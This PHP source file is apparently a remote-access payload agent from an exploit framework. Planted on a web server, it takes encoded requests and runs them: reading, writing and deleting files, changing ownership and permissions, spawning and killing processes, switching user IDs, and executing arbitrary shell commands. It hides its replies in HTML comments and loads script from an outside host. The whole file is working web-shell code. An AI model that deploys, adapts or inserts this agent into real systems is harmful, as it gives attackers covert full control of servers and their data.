<?php

class RPC_Utils
{
  public static function format_command($args)
  {
    $program   = array_shift($args);
    $arguments = array_map('escapeshellarg', $args);

    return $program . ' ' . join(' ', $arguments);
  }

  public static function parse_env($text)
  {
    $lines = preg_split('/\r?\n/', $text);
    $env = array();

    foreach ($lines as $line) {
      list($name, $value) = explode('=', $line, 2);
      $env[$name] = $value;
    }

    return $env;
  }
}

define('RPC_FS_BLOCK_SIZE', 1024 * 512);

class RPC_FileSystem
{
  public static function read($args)
  {
    $file = fopen($args[0], "rb");
    fseek($file, intval($args[1]));

    $data = fread($file, RPC_FS_BLOCK_SIZE);

    fclose($file);
    return $data;
  }

  public static function write($args)
  {
    $file = fopen($args[0], "wb");
    fseek($file, intval($args[1]));

    $length = fwrite($file, $args[2]);

    fclose($file);
    return $length;
  }

  public static function stat($args)
  {
    $data = stat($args[0]);

    return array(
      'inode'     => $data[1],
      'mode'      => $data[2],
      'nlinks'    => $data[3],
      'uid'       => $data[4],
      'gid'       => $data[5],
      'size'      => $data[7],
      'atime'     => $data[8],
      'mtime'     => $data[9],
      'ctime'     => $data[10],
      'blocksize' => $data[11],
      'blocks'    => $data[12]
    );
  }

  public static function readlink($args)
  {
    return readlink($args[0]);
  }
  public static function getcwd($args)
  {
    return getcwd();
  }
  public static function chdir($args)
  {
    chdir($args[0]);
    return getcwd();
  }

  public static function readdir($args)
  {
    $dir = opendir($args[0]);
    $entries = array();

    while (($entry = readdir($dir)) != false) {
      array_push($entries, $entry);
    }

    return $entries;
  }

  public static function glob($args)
  {
    return glob($args[0]);
  }
  public static function mktemp($args)
  {
    return tempnam(sys_get_temp_dir(), $args[0]);
  }
  public static function mkdir($args)
  {
    return mkdir($args[0]);
  }
  public static function copy($args)
  {
    return copy($args[0], $args[1]);
  }
  public static function unlink($args)
  {
    return unlink($args[0]);
  }
  public static function rmdir($args)
  {
    return rmdir($args[0]);
  }
  public static function move($args)
  {
    return rename($args[0], $args[1]);
  }
  public static function link($args)
  {
    return link($args[0], $args[1]);
  }
  public static function chown($args)
  {
    return chown($args[0], $args[1]);
  }
  public static function chgrp($args)
  {
    return chgrp($args[0], $args[1]);
  }
  public static function chmod($args)
  {
    return chmod($args[0], $args[1]);
  }
}

class RPC_Process
{
  public static function getpid($args)
  {
    return @posix_getpid();
  }
  public static function getppid($args)
  {
    return @posix_getppid();
  }
  public static function getuid($args)
  {
    return @posix_getuid();
  }
  public static function setuid($args)
  {
    return @posix_setuid(intval($args[0]));
  }
  public static function geteuid($args)
  {
    return @posix_geteuid();
  }
  public static function seteuid($args)
  {
    return @posix_seteuid(intval($args[0]));
  }
  public static function getgid($args)
  {
    return @posix_getgid();
  }
  public static function setgid($args)
  {
    return @posix_setgid(intval($args[0]));
  }
  public static function getegid($args)
  {
    return @posix_getegid();
  }
  public static function setegid($args)
  {
    return @posix_setegid(intval($args[0]));
  }
  public static function getsid($args)
  {
    return @posix_getsid();
  }
  public static function setsid($args)
  {
    return @posix_setsid();
  }

  public static function spawn($args)
  {
    $pid = pcntl_fork();

    switch ($pid) {
      case -1:
        return false;
      case 0:
        exec(RPC_Utils::format_command($args));
      default:
        return true;
    }
  }

  public static function kill($args)
  {
    if (isset($args[1])) {
      $signal = constant("SIG{$args[1]}");
    } else {
      $signal = SIGKILL;
    }

    return posix_kill(intval($args[0]), $signal);
  }

  public static function getcwd($args)
  {
    return RPC_FileSystem::getcwd($args);
  }
  public static function chdir($args)
  {
    return RPC_FileSystem::chdir($args);
  }
  public static function time($args)
  {
    return time();
  }
}

define('RPC_SHELL_DELIMINATOR', str_repeat('#', 80));

class RPC_Shell
{
  public static function exec($args)
  {
    $commands = array(
      array('env'),
      array('echo', RPC_SHELL_DELIMINATOR),
      $args,
      array('echo', RPC_SHELL_DELIMINATOR),
      array('env')
    );
    $command = join('; ', array_map(array('RPC_Utils', 'format_command'), $commands));

    $output  = shell_exec($command);

    list($orig_env, $output, $new_env) = explode(RPC_SHELL_DELIMINATOR, $output, 3);

    $output   = chop($output);
    $orig_env = RPC_Utils::parse_env($orig_env);
    $new_env  = RPC_Utils::parse_env($new_env);

    return array(
      'output' => $output,
      'env' => array_diff_assoc($orig_env, $new_env)
    );
  }
}



global $rpc_exception;

function rpc_error_handler($errno, $errstr)
{
  switch ($errno) {
    case E_WARNING:
    case E_USER_WARNING:
    case E_USER_ERROR:
      $rpc_exception = $errstr;
  }
}

class RPC
{
  public static function serialize($message)
  {
    return base64_encode(json_encode($message));
  }

  public static function deserialize($data)
  {
    return json_decode(base64_decode($data));
  }

  public static function lookup($names)
  {
    $map = array(
      'format' => 'Utils',
      'parse' => 'Utils',
      'fs' => 'FileSystem',
      'process' => 'Process',
      'shell' => 'Shell'
    );
    $prefix = $names[0];
    $class = 'RPC_' . (isset($map[$prefix]) ? $map[$prefix] : ucfirst($prefix));
    $method = $names[1];
    return array($class, $method);
  }

  public static function call($request)
  {
    if (isset($request->cwd)) {
      chdir($request->cwd);
    }

    if (isset($request->env) && is_array($request->env)) {
      foreach ($request->env as $name => $value) {
        putenv("{$name}={$value}");
      }
    }

    list($class, $method) = self::lookup(explode('.', $request->method));
    $arguments = $request->arguments;

    set_error_handler('rpc_error_handler');
    $value = call_user_func(array($class, $method), $arguments);

    if (isset($rpc_exception)) {
      return array('exception' => $rpc_exception);
    } else {
      return array('return'    => $value);
    }
  }
}

function is_ipaddress($string)
{
  $parts = explode('.', $string);
  if (count($parts) !== 4) return false;
  foreach ($parts as $pos => $tval) {
    $val = intval($tval);
    if ($tval !== (string)$val)
      return false;
    if (($pos == 0 or $pos == 3) && ($val < 1 or $val > 254))
      return false;
    elseif ($val < 1 or $val > 255)
      return false;
  }
  return true;
}

function start_standalone_http_server($port = NULL, $addr = NULL)
{
  if (!$addr) {
    $addr = '127.0.0.1';
  } else if (!is_ipaddress($addr)) {
    return "invalid address\n";
  }

  if (!$port) {
    $port = 8000;
  } else if (!preg_match('/\d+/', $port)) {
    return "invalid port\n";
  }

  $socket = stream_socket_server("tcp://$addr:$port", $errno, $errstr);
  if (!$socket) {
    return $errstr . ' (' . $errno . ')' . PHP_EOL;
  } else {
    $defaults = array(
      'Content-Type' => 'text/html',
      'Server' => 'PHP ' . phpversion()
    );
    while ($conn = stream_socket_accept($socket, -1)) {
      $request = '';
      $ct = 0;

      // The ronin-rpc engine may not be the most compliant web client
      // while (substr($request, -4) !== "\r\n\r\n") {
      while (!preg_match('/\\r\\n\\r\\n/m', $request)) {
        $request .= fread($conn, 1024);
      }

      // We expect only one query parameter and we do not care what its called
      if (!preg_match(
        '|[A-Z]+ /[^\?]*(?:([^=]+)=([^\s]+))? HTTP/\d.\d|',
        $request,
        $matches
      )) {
        print "recieved an invalid query string ($request)\n";
        continue;
      }
      $request = urldecode($matches[2]);

      $response = RPC::serialize(RPC::call(RPC::deserialize($request)));
      $body = "<!-- <rpc:response>{$response}</rpc:response> -->";
      $header = "Content-Type: text/html\r\n";
      $header .= "Server: PHP " . phpversion() . "\r\n";
      $header .= "Content-Length: " . strlen($body) . "\r\n";
      fwrite($conn, implode("\r\n", array(
        'HTTP/1.1 200',
        $header,
        $body
      )));
      fclose($conn);
    }
    fclose($socket);
  }
}

define('RPC_BASE_URL', 'http://ronin-ruby.github.com/data/ronin-exploits/payloads/php/rpc');

if (isset($_REQUEST['_request'])) {
  $request  = RPC::deserialize(rawurldecode($_REQUEST['_request']));
  $response = RPC::serialize(RPC::call($request));

  echo "<!-- <rpc:response>{$response}</rpc:response> -->";
} else if (PHP_SAPI === 'cli') {
  $usage = "usage: php agent.php {--http PORT [HOST] | --listen PORT [HOST] | --connect HOST PORT}";

  if (count($argv) > 1) {
    // This is running from the command line.  Parse command line arguments and
    // start the standalone server
    switch ($argv[1]) {
      case '--http':
        $result = start_standalone_http_server($argv[2], $argv[3]);
        print $result;
        break;
      case '--listen':
      case '--connect':
      case '--help':
        echo $usage;
        exit;
      default:
        fwrite(STDERR, "unknown option: " . $argv[1] . PHP_EOL);
        exit(1);
    }
  } else {
    fwrite(STDERR, $usage . PHP_EOL);
    exit(1);
  }
} else {
  echo '<link rel="stylesheet" type="text/css" href="' . RPC_BASE_URL . '.css" />';
  echo '<script type="text/javascript" src="' . RPC_BASE_URL . '.js"></script>';
}
